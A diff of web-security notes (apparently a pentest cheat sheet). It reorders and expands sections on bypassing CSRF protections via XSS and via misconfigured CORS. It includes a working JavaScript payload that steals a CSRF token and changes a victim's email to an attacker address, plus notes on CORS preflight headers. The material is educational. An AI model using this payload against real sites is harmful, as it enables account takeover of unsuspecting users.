@@ -144,10 +144,42 @@
   https://vulnerable.tbl.attacker.tbl/
   ```
 
+## Bypassing CSRF protections via XSS
+
+* CSRF protections can be entirely bypassed by `Cross-Site Scripting (XSS)` vulnerabilities, as XSS enables attackers to run arbitrary JavaScript in the victim's browser.
+* Similar to the following CORS misconfiguration scenario, XSS enables an attacker to make requests as the victim and access the server's responses. By inspecting server responses, an attacker can obtain CSRF tokens and craft seemingly legitimate requests.
+* These unauthorized requests can retrieve server responses that include sensitive information, such as CSRF tokens embedded in HTML forms or API responses. This allows the attacker to use the stolen token for subsequent state-changing requests:
+
+  ```html
+  <script>
+    fetch('/change/email', { credentials: 'include' })
+      .then(response => response.text())
+      .then(html => {
+        // Parse the HTML to extract the CSRF token
+        const parser = new DOMParser();
+        const doc = parser.parseFromString(html, 'text/html');
+        const csrfToken = doc.querySelector('input[name="csrf-token"]').value;
+
+        // Use the extracted CSRF token to craft a malicious request
+        fetch('/change/email', {
+          method: 'POST',
+          credentials: 'include', // Send victim's session cookie
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+          },
+          body: `email=attacker@attacker.tbl&csrf-token=${csrfToken}`,
+        });
+      });
+  </script>
+  ```
+
+  * Using the victim's authentication (i.e., via cookies), the first fetch request retrieves the CSRF token from a protected endpoint, with `DOMParser` parsing the HTML to find the hidden `csrf-token` input field and store its value in `csrfToken`.
+  * The attacker leverages then the stolen CSRF token to send a POST request to `/change/email`, altering the victim's email to `attacker@attacker.tbl` while using again the victim's authenticated session cookies.
+
 ## Bypassing CSRF protections via misconfigured CORS
 
-* Misconfigured `Cross-Origin Resource Sharing (CORS)` policies can allow an attacker to perform cross-origin requests that should otherwise be blocked.
-* A web application that enables cross-origin requests (`Access-Control-Allow-Origin: *`) while accepting credentials (`Access-Control-Allow-Credentials: true`) is susceptible to CSRF exploitation while bypassing any anti-token security mechanism.
+* Misconfigured `Cross-Origin Resource Sharing (CORS)` policies can also allow an attacker to perform cross-origin requests that should otherwise be blocked.
+* A web application that enables cross-origin requests and dynamically reflects the origin (`Access-Control-Allow-Origin: https://attacker.com`) while accepting credentials (`Access-Control-Allow-Credentials: true`) is susceptible to CSRF exploitation bypassing any anti-token security mechanism.
 * As this behavior enables JavaScript to read HTTP responses, CSRF tokens can be retrieved via a GET request and then used to execute the undesired action (e.g., change the user's email address):
 
   ```html
@@ -175,36 +207,8 @@
   </script>
   ```
 
-  * In this case, the CSRF token is retrieved from a web application endpoint rather than being embedded as a hidden input field in an HTML form.
+  * In this case, as can be seen, the CSRF token is retrieved from a web application endpoint rather than being embedded as a hidden input field in an HTML form.
+  * It also includes the CSRF token in the `X-CSRF-Token` header, requiring the CORS policy to explicitly allow `X-CSRF-Token` via `Access-Control-Allow-Headers: X-CSRF-Token`, otherwise the browser will block the request before reaching the server.
+  * Similarly, if `POST` method is not permitted in `Access-Control-Allow-Methods: POST`, the web application's CORS policy will cause the browser to block preflighted cross-origin POST requests.
 
-## Bypassing CSRF protections via XSS
-
-* CSRF protections can be entirely bypassed by `Cross-Site Scripting (XSS)` vulnerabilities, as XSS enables attackers to run arbitrary JavaScript in the victim's browser.
-* Similar to the CORS misconfiguration scenario, XSS enables an attacker to make requests as the victim and access the server's responses. By inspecting server responses, an attacker can obtain CSRF tokens and craft seemingly legitimate requests.
-* These unauthorized requests can retrieve server responses that include sensitive information, such as CSRF tokens embedded in HTML forms or API responses. This allows the attacker to use the stolen token for subsequent state-changing requests:
-
-  ```html
-  <script>
-    fetch('/change/email', { credentials: 'include' })
-      .then(response => response.text())
-      .then(html => {
-        // Parse the HTML to extract the CSRF token
-        const parser = new DOMParser();
-        const doc = parser.parseFromString(html, 'text/html');
-        const csrfToken = doc.querySelector('input[name="csrf-token"]').value;
-
-        // Use the extracted CSRF token to craft a malicious request
-        fetch('/change/email', {
-          method: 'POST',
-          credentials: 'include', // Send victim's session cookie
-          headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
-          },
-          body: `email=attacker@attacker.tbl&csrf-token=${csrfToken}`,
-        });
-      });
-  </script>
-  ```
-
-  * Using the victim's authentication (via cookies), the first fetch request retrieves the CSRF token from a protected endpoint, with `DOMParser` parsing the HTML to find the hidden `csrf-token` input field and store its value in `csrfToken`.
-  * The attacker leverages then the stolen CSRF token to send a POST request to `/change/email`, altering the victim’s email to `attacker@attacker.tbl` while using again the victim's authenticated session cookies.
+    > :older_man: There is a slight difference between including the token in the request body and placing it in a custom HTTP header, as requests with custom headers are inherently restricted by the `Same-Origin Policy (SOP)`, which represents an additional protection layer.
